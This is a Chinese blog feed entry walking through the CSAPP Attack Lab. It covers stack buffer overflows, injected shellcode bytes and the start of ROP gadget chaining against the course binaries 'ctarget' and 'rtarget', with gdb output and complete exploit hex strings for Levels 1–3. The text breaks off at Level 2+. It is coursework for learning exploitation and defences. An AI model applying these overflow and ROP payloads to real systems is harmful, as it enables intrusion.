<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>博文 on codgician</title>
		<link>https://codgician.me/zh-hans/posts/</link>
		<description>Recent content in 博文 on codgician</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>zh-hans</language>
		<copyright>This work is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License.</copyright>
		<lastBuildDate>Sun, 10 May 2020 16:29:10 +0800</lastBuildDate>
		<atom:link href="https://codgician.me/zh-hans/posts/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>CSAPP: Attack Lab</title>
			<link>https://codgician.me/zh-hans/posts/2020/05/csapp-attack-lab/</link>
			<pubDate>Sun, 10 May 2020 16:29:10 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2020/05/csapp-attack-lab/</guid>
			<description>实验内容 本实验是 CSAPP:3e 一书的配套实验之一，相关资料如下： 实验文件 实验要求 在本次实验中，我们将试着对给定的可在 Linux 下运行的二进制文件进行缓冲区溢出攻</description>
			<content type="html"><![CDATA[<h1 id="实验内容">实验内容</h1>
<p>本实验是 CSAPP:3e 一书的配套实验之一，相关资料如下：</p>
<ul>
<li><a href="http://csapp.cs.cmu.edu/3e/target1.tar">实验文件</a></li>
<li><a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">实验要求</a></li>
</ul>
<p>在本次实验中，我们将试着对给定的可在 Linux 下运行的二进制文件进行缓冲区溢出攻击。实验一共分为五个部分，每一个部分的具体要求都会在后文中详述。</p>
<p>本文随自己的实验进度缓慢更新……<del>（咕咕）</del></p>
<h1 id="代码注入攻击">代码注入攻击</h1>
<h2 id="回顾">回顾</h2>
<p><strong>对于 x86 平台，程序运行时调用函数的过程是怎样的？</strong></p>
<p>为了能够实现函数递归，函数调用的相关信息都是在 <em>栈 (stack)</em> 中进行维护的。在 x86-64 汇编中，寄存器 <code>%rsp</code> 指向栈顶位置，寄存器 <code>%rbp</code> 指向栈起始的位置，同时栈是从高地址向低地址生长的。当调用函数时，大致需要依次进行如下步骤：</p>
<ul>
<li>首先需要存储参数。对于 x86，从左至右的前 6 个参数会被分别存入 <code>%rdi%</code>, <code>%rsi</code>, <code>%rdx</code>, <code>%rcx</code>, <code>%r8</code>, <code>%r9</code>。对于剩余的参数则会被压入栈中。需要注意的是，对于参数的处理是从右到左进行的；</li>
<li>将返回地址压入栈中；</li>
<li>将旧的 <code>%rbp</code> 值压入栈中，并将 <code>%rbp</code> 的值更新为 <code>%rsp</code>。换言之，这一步即为被调用的函数更新栈的起始位置；</li>
<li>接下来便可以执行被调用的函数了；</li>
<li>执行完后，将旧 <code>%rbp</code> 值从栈中弹出，并恢复 <code>%rbp</code> 的值（因为现在回到之前的函数了）；</li>
<li>执行 <code>ret</code> 指令，跳转到返回地址（这一过程中会将栈中的参数以及返回地址弹出）。</li>
</ul>
<p>可见，如果被执行的函数中调用了 <code>gets()</code> 函数（即允许用户输入字符串）同时没有增加任何额外安全措施，我们可以通过精心构造字符串，使得该字符串长度超出缓冲区大小，以达到对栈中其他位置的信息进行覆盖的目的。例如，我们可以通过覆盖返回地址字段，使得该函数被执行完后返回到其他的位置。更进一步，可以把返回地址改为字符串本身所在的位置，并在利用字符串注入汇编代码使机器执行。下面将通过三个实验来进一步说明这一点。</p>
<h2 id="level-1">Level 1</h2>
<h3 id="要求">要求</h3>
<p>在 Level 1 中，暂且不要求注入自己构造的代码，而是构造一个字符串，使得程序执行另一处已有的代码。</p>
<p>在二进制可执行文件 <code>ctarget</code> 中，<code>getbuf()</code> 函数则是一个存在漏洞的获取用户输入的函数。其源代码如下：</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="nf">getbuf</span><span class="p">()</span> 
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span>
    <span class="n">Gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>其中 <code>Gets()</code> 与标准库中的 <code>gets()</code> 类似，它会一直读入字符串知道遇到结束符为止，而不会对缓冲区大小是否溢出进行任何检查。<code>getbuf()</code> 函数在 <code>test()</code> 函数中被调用，其源代码如下：</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">test</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">val</span><span class="p">;</span>
    <span class="n">val</span> <span class="o">=</span> <span class="n">getbuf</span><span class="p">();</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;No exploit. Getbuf returned 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p><code>getbuf()</code> 在执行完成后会返回到 <code>test()</code> 继续向后执行。我们的目的是让 <code>getbuf()</code> 执行完后跳转到程序 <code>touch1()</code> 函数处进行执行。<code>touch1()</code> 的源代码如下：</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">touch1</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="cm">/* Part of validation protocol */</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Touch1!: You called touch1()</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">validate</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>由于本菜鸡不是 CMU 的学生，因此自然也没发连接到 CMU 记录分数的服务器。因此在运行 <code>ctarget</code> 时需要加上参数 <code>-q</code> 以避免前述服务器进行连接。另外，由于构造出的字符串很可能包含非法的 ASCII 字符，为了方便大家，<code>ctarget</code> 支持二进制文件中读取信息。同时，作者也很贴心地提供了小工具 <code>hex2raw</code> 以帮助大家把构造好的 16 进制字符串转换为二进制文件。首先要将我们构造好的字符串逐字节写入一个文本文件（如 <code>hex.txt</code>），每一个字节均使用两位 16 进制表示，并且字符之间用空格隔开。如：</p>
<pre><code>0a 2d 3f ...
</code></pre><p>便可以生成对应二进制文件：</p>
<pre><code>$ hex2raw &lt; hex.txt &gt; raw
</code></pre><p>最后再将其传给 <code>ctarget</code>：</p>
<pre><code>$ ctarget -q -i raw
</code></pre><p>对于汇编与反汇编，在 Linux 中可以借助 <code>binutils</code> 包中的 <code>objdump</code> 与 <code>as</code> 工具。</p>
<h3 id="过程">过程</h3>
<p>先运行一下 <code>./ctarget</code> 看看它长啥样：</p>
<pre><code>$ ./ctarget -q
Cookie: 0x59b997fa
Type string:Hello World!
No exploit.  Getbuf returned 0x1
Normal return
</code></pre><p>整个程序会要求我们输入一个字符串并显示一些结果。在这里我首先输入了 <code>Hello, World!</code>。显然这个字符串是不足以让程序出现问题的，因此其提示 <code>No exploit</code>。而我们的目的是执行函数 <code>touch1()</code>，故若成功其提示应当包含 <code>Touch1!: You called touch1()</code>。</p>
<p>首先来看看 <code>getbuf()</code> 的汇编代码：</p>
<pre><code>$ gdb --args ./ctarget -q

(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 &lt;+0&gt;:   sub    $0x28,%rsp
   0x00000000004017ac &lt;+4&gt;:   mov    %rsp,%rdi
   0x00000000004017af &lt;+7&gt;:   callq  0x401a40 &lt;Gets&gt;
   0x00000000004017b4 &lt;+12&gt;:  mov    $0x1,%eax
   0x00000000004017b9 &lt;+17&gt;:  add    $0x28,%rsp
   0x00000000004017bd &lt;+21&gt;:  retq   
End of assembler dump.
</code></pre><p>第一条指令表明栈顶 <code>%rsp</code> 向下生长了 <code>0x28</code>（即 40）个字节，故得知 <code>BUFFER_SIZE</code> 值为 40。输入的字符是从低地址向高地址存储的，恰好函数的返回地址也在高地址里，这为修改函数返回地址提供了可能。不妨在 <code>getbuf()</code> 处（即 <code>*0x4017a8</code> 处）打上断点，此时栈顶应当指向返回地址：</p>
<pre><code>(gdb) b getbuf
Breakpoint 1 at 0x4017a8: file buf.c, line 12.

(gdb) r
Starting program: /home/codgician/GitHub/explorations/CSAPP/attack-lab/ctarget -q
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:12

(gdb) x $rsp
0x5561dca0:	0x00401976

(gdb) x 0x00401976
0x401976 &lt;test+14&gt;:	0x88bec289
</code></pre><p>可见栈顶 <code>0x5561dca0</code> 中的值为 <code>0x00401976</code>。而该地址恰好指向 <code>test()</code> 中调用 <code>getbuf()</code> 之后的位置，故可确定这就是我们想要修改的返回地址。来查询一下 <code>touch1()</code> 的地址：</p>
<pre><code>(gdb) info address touch1
Symbol &quot;touch1&quot; is a function at address 0x4017c0.
</code></pre><p>需要注意的是，由于 x86 采取 <em>小端 (Little Endian)</em> 字节顺序，若希望栈中出现 <code>0x004017c0</code>，则我们构造的输入应当为 <code>c0 17 40 00</code>。另外需要注意，对于 64 位程序地址长度为 64 位，所以需要补齐为 <code>c0 17 40 00 00 00 00 00</code>。我们构造的字符串只需要首先包含 40 个任意字符，接下來再包含目标地址即可。<code>hex.txt</code> 内容如下：</p>
<pre><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00
</code></pre><p>使用 <code>hex2raw</code> 将其转换为二进制文件后传入 <code>ctarget</code>，便可以达成目的：</p>
<pre><code>$ ./hex2raw &lt; hex.txt &gt; raw &amp;&amp; ./ctarget -q -i raw
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
</code></pre><h2 id="level-2">Level 2</h2>
<h3 id="要求-1">要求</h3>
<p>在 Level 2 中，要求执行的函数变为 <code>touch2()</code>。与上一关不同的是，<code>touch2()</code> 函数带有一个参数。其源代码如下：</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">touch2</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">val</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="cm">/* Part of validation protocol */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">val</span> <span class="o">==</span> <span class="n">cookie</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Touch2!: You called touch2(0x%.8x)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
        <span class="n">validate</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Misfire: You called touch2(0x%.8x)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
        <span class="n">fail</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p><code>cookie</code> 值即之前运行时提示的 <code>0x59b997fa</code>。最终应当得到包含 <code>Touch2!: You called touch2(0x59b997fa)</code> 的结果。</p>
<h3 id="过程-1">过程</h3>
<p>刚开始的时候本菜鸡准备投机取巧：直接跳转到 <code>if (val == cookie)</code> 后的语句之处。不过可惜作者早就考虑到了，<code>validate</code> 函数中应该还会对 <code>val</code> 进行进一步检查，所以就凉了。</p>
<p>复杂一点的思路，便是在构造的缓冲区中包含调用 <code>touch2()</code> 的汇编代码，并让程序跳转到注入的代码处执行。先来看看 <code>touch2()</code> 的汇编代码：</p>
<pre><code>(gdb) disas touch2
Dump of assembler code for function touch2:
   0x00000000004017ec &lt;+0&gt;:	  sub    $0x8,%rsp
   0x00000000004017f0 &lt;+4&gt;:	  mov    %edi,%edx
   0x00000000004017f2 &lt;+6&gt;:   movl   $0x2,0x202ce0(%rip)    # 0x6044dc &lt;vlevel&gt;
   0x00000000004017fc &lt;+16&gt;:  cmp    0x202ce2(%rip),%edi    # 0x6044e4 &lt;cookie&gt;
   0x0000000000401802 &lt;+22&gt;:  jne    0x401824 &lt;touch2+56&gt;
   0x0000000000401804 &lt;+24&gt;:  mov    $0x4030e8,%esi
   0x0000000000401809 &lt;+29&gt;:  mov    $0x1,%edi
   0x000000000040180e &lt;+34&gt;:  mov    $0x0,%eax
   0x0000000000401813 &lt;+39&gt;:  callq  0x400df0 &lt;__printf_chk@plt&gt;
   0x0000000000401818 &lt;+44&gt;:  mov    $0x2,%edi
   0x000000000040181d &lt;+49&gt;:  callq  0x401c8d &lt;validate&gt;
   0x0000000000401822 &lt;+54&gt;:  jmp    0x401842 &lt;touch2+86&gt;
   0x0000000000401824 &lt;+56&gt;:  mov    $0x403110,%esi
   0x0000000000401829 &lt;+61&gt;:  mov    $0x1,%edi
   0x000000000040182e &lt;+66&gt;:  mov    $0x0,%eax
   0x0000000000401833 &lt;+71&gt;:  callq  0x400df0 &lt;__printf_chk@plt&gt;
   0x0000000000401838 &lt;+76&gt;:  mov    $0x2,%edi
   0x000000000040183d &lt;+81&gt;:  callq  0x401d4f &lt;fail&gt;
   0x0000000000401842 &lt;+86&gt;:  mov    $0x0,%edi
   0x0000000000401847 &lt;+91&gt;:  callq  0x400e40 &lt;exit@plt&gt;
End of assembler dump.
</code></pre><p>可见，<code>touch2()</code> 传入的参数 <code>val</code> 被存放在寄存器 <code>%edi</code> 中，并且在 <code>&lt;+16&gt;</code> 处与 <code>cookie</code> 进行比较。因此，在进入 <code>touch2()</code> 前要将寄存器 <code>%edi</code> 中的值修改掉，即如下汇编代码：</p>
<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">mov</span> <span class="no">$0x59b997fa</span><span class="p">,</span> <span class="nv">%edi</span>
</code></pre></div><p>除此之外，需要将程序跳转至 <code>touch2()</code> 处（地址为 `0x004017ec）。故：</p>
<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">mov</span> <span class="no">$0x004017ec</span><span class="p">,</span> <span class="nv">%eax</span>
<span class="nf">jmp</span> <span class="p">*</span><span class="nv">%eax</span>
</code></pre></div><p>注：对于 64 位环境，这里使用 <code>%rax</code> 也是可以的。</p>
<p>将上述代码汇编后，得到：</p>
<pre><code>BF FA 97 B9 59 B8 EC 17 40 00 FF E0
</code></pre><p>最后借助与 Level 1 类似的思路，让 <code>getbuf()</code> 执行完成后跳转到刚刚注入的代码，也就是缓冲区的起始位置 <code>0x5561dc78</code>（即 Level 1 中所提到的返回地址的位置减去 <code>0x28</code>）。最终构造出：</p>
<pre><code>BF FA 97 B9 59 B8 EC 17 40 00 FF E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
</code></pre><p>试试看～</p>
<pre><code>$ ./hex2raw &lt; hex.txt &gt; raw &amp;&amp; ./ctarget -q -i raw
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:BF FA 97 B9 59 B8 EC 17 40 00 FF E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
</code></pre><h2 id="level-3">Level 3</h2>
<h3 id="要求-2">要求</h3>
<p>Level 3 在 Level 2 的基础上做了一些变动：要执行的函数不再以整形为参数，而以一个字符串为参数。<code>hexmatch()</code> 和 <code>touch3()</code> 都是包含在 <code>ctarget</code> 中的函数：</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* Compare string to hex represention of unsigned value */</span>
<span class="kt">int</span> <span class="nf">hexmatch</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">val</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">sval</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">cbuf</span><span class="p">[</span><span class="mi">110</span><span class="p">];</span>
    <span class="cm">/* Make position of check string unpredictable */</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="n">cbuf</span> <span class="o">+</span> <span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">100</span><span class="p">;</span>
    <span class="n">sprintf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;%.8x&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">sval</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">touch3</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">sval</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span> <span class="cm">/* Part of validation protocol */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hexmatch</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">sval</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Touch3!: You called touch3(</span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;</span><span class="s">)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">sval</span><span class="p">);</span>
        <span class="n">validate</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Misfire: You called touch3(</span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;</span><span class="s">)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">sval</span><span class="p">);</span>
        <span class="n">fail</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>换言之，我们要传入 <code>0x59b997fa</code> 对应的字符串（不包含 <code>0x</code>，即 <code>59b997fa</code>），并执行 <code>touch3()</code>，得到包含 <code>Touch3!: You called touch3(&quot;59b997fa&quot;)</code> 的结果。</p>
<h3 id="过程-2">过程</h3>
<p>先来看看 <code>touch3()</code> 的汇编代码：</p>
<pre><code>(gdb) disas touch3
Dump of assembler code for function touch3:
   0x00000000004018fa &lt;+0&gt;:     push   %rbx
   0x00000000004018fb &lt;+1&gt;:	    mov    %rdi,%rbx
   0x00000000004018fe &lt;+4&gt;:     movl   $0x3,0x202bd4(%rip)      # 0x6044dc &lt;vlevel&gt;
   0x0000000000401908 &lt;+14&gt;:    mov    %rdi,%rsi
   0x000000000040190b &lt;+17&gt;:    mov    0x202bd3(%rip),%edi      # 0x6044e4 &lt;cookie&gt;
   0x0000000000401911 &lt;+23&gt;:    callq  0x40184c &lt;hexmatch&gt;
   0x0000000000401916 &lt;+28&gt;:    test   %eax,%eax
   0x0000000000401918 &lt;+30&gt;:    je     0x40193d &lt;touch3+67&gt;
   0x000000000040191a &lt;+32&gt;:    mov    %rbx,%rdx
   0x000000000040191d &lt;+35&gt;:    mov    $0x403138,%esi
   0x0000000000401922 &lt;+40&gt;:    mov    $0x1,%edi
   0x0000000000401927 &lt;+45&gt;:	mov    $0x0,%eax
   0x000000000040192c &lt;+50&gt;:    callq  0x400df0 &lt;__printf_chk@plt&gt;
   0x0000000000401931 &lt;+55&gt;:    mov    $0x3,%edi
   0x0000000000401936 &lt;+60&gt;：   callq  0x401c8d &lt;validate&gt;
   0x000000000040193b &lt;+65&gt;:    jmp    0x40195e &lt;touch3+100&gt;
   0x000000000040193d &lt;+67&gt;:    mov    %rbx,%rdx
   0x0000000000401940 &lt;+70&gt;:    mov    $0x403160,%esi
   0x0000000000401945 &lt;+75&gt;:    mov    $0x1,%edi
   0x000000000040194a &lt;+80&gt;:    mov    $0x0,%eax
   0x000000000040194f &lt;+85&gt;:    callq  0x400df0 &lt;__printf_chk@plt&gt;
   0x0000000000401954 &lt;+90&gt;:    mov    $0x3,%edi
   0x0000000000401959 &lt;+95&gt;:    callq  0x401d4f &lt;fail&gt;
   0x000000000040195e &lt;+100&gt;:   mov    $0x0,%edi
   0x0000000000401963 &lt;+105&gt;:   callq  0x400e40 &lt;exit@plt&gt;
End of assembler dump.
</code></pre><p><code>touch3()</code> 只包含一个参数，即指向字符串的指针，因此其值应当被存储于寄存器 <code>%rdi</code> 中。因此大致的思路为：</p>
<ul>
<li>使用与 Level 1 类似的思路跳转到输入缓冲区开头；</li>
<li>输入缓冲区开头处构造修改 <code>%rdi</code> 的指令，指向缓冲区中的另一位置（记之为 p）；</li>
<li>接下来构造跳转至 <code>touch3()</code> 的指令；</li>
<li>在 p 处存入 <code>cookie</code> 的值。</li>
</ul>
<p>另外，观察到 <code>getbuf()</code> 执行完时 <code>%rsp</code> 是指向缓冲区高地址处的。由于后面还涉及 <code>hexmatch()</code> 函数的调用，为了防止进栈操作把构造的缓冲区覆盖掉，需要对 <code>%rsp</code> 减去缓冲区大小 <code>0x28</code>。由于地址没有超出 32 位，下面用 <code>%edi</code> 代替 <code>%rdi</code> 以减小汇编代码长度：</p>
<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">sub</span> <span class="no">$0x28</span><span class="p">,</span> <span class="nv">%rsp</span>
<span class="nf">mov</span> <span class="no">$0x5561dc88</span><span class="p">,</span> <span class="nv">%edi</span>
<span class="nf">mov</span> <span class="no">$0x004018fa</span><span class="p">,</span> <span class="nv">%eax</span>
<span class="nf">jmp</span> <span class="p">*</span><span class="nv">%eax</span>
</code></pre></div><p>汇编后为：</p>
<pre><code>83 EC 28 BF 88 DC 61 55 B8 FA 18 40 00 FF E0
</code></pre><p>其中 <code>0x5561dc88</code> 即缓冲区最低位置 <code>0x5561dc78</code> 加上上述汇编指令对应二进制长度后的结果（长度为 15 字节，对齐为 16 字节）。其指向我们即将构造的 <code>cookie</code> 对应字符串的起始地址。</p>
<p>接下来构造 <code>0x59b997fa</code> 对应的字符串：</p>
<pre><code>35 39 62 39 39 37 66 61
</code></pre><p>因此，完整的字符串应当为：</p>
<pre><code>83 EC 28 BF 88 DC 61 55 B8 FA 18 40 00 FF E0 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
</code></pre><p>试试看~</p>
<pre><code>$ ./hex2raw &lt; hex.txt &gt; raw &amp;&amp; ./ctarget -q -i raw
Cookie: 0x59b997fa
Touch3!: You called touch3(&quot;59b997fa&quot;)
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:83 EC 28 BF 88 DC 61 55 B8 FA 18 40 00 FF E0 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
</code></pre><h1 id="面向返回编程">面向返回编程</h1>
<h2 id="回顾-1">回顾</h2>
<p><strong>有办法相对通用地避免前面提到的代码注入吗？</strong></p>
<p>虽然使用更加安全的 <code>gets()</code> 是避免此类漏洞最简单的方案，但能否在不需要程序员对代码本身做任何修改的前提下使得代码注入更加困难？</p>
<ul>
<li><strong>运行时随机化栈地址</strong>: 之前实验中，都需要让程序跳转至缓冲区处执行注入的代码。正是因为缓冲区在栈中的地址每一次运行时都是不变的，才让我们轻松地达到了目的。如果每次运行程序，缓冲区所处的地址都不相同，注入代码会更加困难；</li>
<li><strong>将栈标记为不可执行区域</strong>：之前实验中，注入的代码都被存放在栈中。如果将栈标记为不可执行区域，使得程序拒绝执行栈中代码，注入代码便会更加困难；</li>
<li><strong>Canary 保护</strong>：其核心思想在于对压入栈的每一帧末尾添加一个额外的随机数（称作 Canary）。这个随机数的作用与金丝雀很像，即一旦发现 Canary 值被更改，则会导致程序运行异常并停止。若想通过溢出来修改返回地址，则必然需要先覆盖掉 Canary。这使得代码注入更加困难了。</li>
</ul>
<p><strong>那，就真的没有一点办法了吗？</strong></p>
<p>虽然没有办法注入自己的代码，但程序本身还是包含非常多指令的。哪怕是非常短的程序，由于大多都会引入标准库，事实上指令数量还是相当可观的。是否可以通过已有的指令来达到我们想达到的目的呢？这就是 <em>面向返回编程 (ROP, Return Oriented Programming)</em> 的核心思想。</p>
<p>我们将由 <code>ret</code> 指令结尾的的若干指令称作一个 gadget。将多个 gadget 组合起来依次执行便可能达到目的。将 gadget 的地址存放在栈中，并且让 <code>%rsp</code> 指向 gadget #1 的地址。在这种状态下，如果程序执行到了 <code>ret</code> 指令，则会跳转到 gadget #1 处执行（<code>%rsp</code> 指向返回地址），同时 <code>%rsp</code> 会向上移动（将返回地址弹栈）并恰好指向栈中 gadget #2 的地址。这样一来，当 gadget #1 执行完 <code>ret</code> 后便会跳转到 gadget #2，依次类推…… 这样便将多段汇编代码像链表一样串了起来。</p>
<p>接下来的两个实验将会展示 ROP 的实际应用。</p>
<h2 id="level-2-1">Level 2+</h2>
<h3 id="要求-3">要求</h3>
<p>要求与 Level 2 一样（调用 <code>touch2()</code>），但目标二进制程序变为 <code>rtarget</code>。<code>rtarget</code> 包含了上述防御措施中的前两种。另外，要求只能使用前 8 个 x86-64 寄存器（<code>%rax</code> ~ <code>%rdi</code>）。</p>
<p>为了简化实验，<code>rtarget</code> 中已经提供了可能需要用到的 gadget,位于 <code>start_farm</code> 标记和 <code>mid_farm</code> 标记之间。</p>
<h3 id="过程-3">过程</h3>
<p>结合之前的实验，我们得到一个大致的思路：</p>
<ul>
<li>通过缓冲区溢出使程序跳转至 gadget #1；</li>
<li>对寄存器 <code>%rdi</code> 进行修改（<code>touch2()</code> 的参数）；</li>
<li>跳转至 <code>touch2()</code> 所在的地址继续执行。</li>
</ul>
<p>我们不太能指望 <code>cookie: 0x59b997fa</code> 出现，因此需要将其作为数据放入缓冲区中，并调用弹栈 <code>popq</code> 指令将其存入寄存器中。</p>
<p>首先反汇编，看一下 <code>start_farm</code> 和 <code>mid_farm</code> 之间有什么：</p>
<pre><code>0000000000401994 &lt;start_farm&gt;:
  401994:	b8 01 00 00 00      mov    $0x1,%eax
  401999:	c3                  retq   

000000000040199a &lt;getval_142&gt;:
  40199a:	b8 fb 78 90 90      mov    $0x909078fb,%eax
  40199f:	c3                  retq   

00000000004019a0 &lt;addval_273&gt;:
  4019a0:	8d 87 48 89 c7 c3   lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                  retq

00000000004019a7 &lt;addval_219&gt;:
  4019a7:	8d 87 51 73 58 90   lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                  retq   

00000000004019ae &lt;setval_237&gt;:
  4019ae:	c7 07 48 89 c7 c7   movl   $0xc7c78948,(%rdi)
  4019b4:	c3                  retq   

00000000004019b5 &lt;setval_424&gt;:
  4019b5:	c7 07 54 c2 58 92   movl   $0x9258c254,(%rdi)
  4019bb:	c3                  retq   

00000000004019bc &lt;setval_470&gt;:
  4019bc:	c7 07 63 48 8d c7   movl   $0xc78d4863,(%rdi)
  4019c2:	c3                  retq   

00000000004019c3 &lt;setval_426&gt;:
  4019c3:	c7 07 48 89 c7 90   movl   $0x90c78948,(%rdi)
  4019c9:	c3                  retq   

00000000004019ca &lt;getval_280&gt;:
  4019ca:	b8 29 58 90 c3      mov    $0xc3905829,%eax
  4019cf:	c3                  retq   

00000000004019d0 &lt;mid_farm&gt;:
  4019d0:	b8 01 00 00 00      mov    $0x1,%eax
  4019d5:	c3                  retq   
</code></pre><p><code>pop</code> 指令的字节码为 <code>58</code>（从栈中取出 64 位数据），在上述代码中寻找到 <code>addval_219</code> 中存在 <code>58 90 c3</code>，其反汇编结果恰好为：</p>
<pre><code>0: 58   pop %rax
1: 90   nop
2: c3   retq 
</code></pre><p>其含义即将栈顶数据弹出并放入寄存器 <code>%rax</code>，因此第一个 gadget 地址可为 <code>0x004019ab</code>。我们可通过缓冲区溢出的形式到达此处（Level 1 的思路）。</p>
<p>接下来我们需要将 <code>%rax</code> 中的值复制进 <code>%rdi</code>。<code>mov</code> 的字节码为 <code>48</code>。在 <code>setval_273</code> 中找到 <code>48 89 c7 c3</code>，其反汇编结果恰好为：</p>
<pre><code>0: 48 89 c7     mov    %rax, %rdi
3: c3           retq   
</code></pre><p>因此第二个 gadget 地址为 <code>0x004019a2</code>。在执行完这两个 gadget 后，就可以进入 <code>touch2()</code> 了，因此栈中接下来要放入 <code>touch2()</code> 的地址 <code>0x004017ec</code>。</p>
<p>构造缓冲区如下（注意将数据补齐 64 位）：</p>
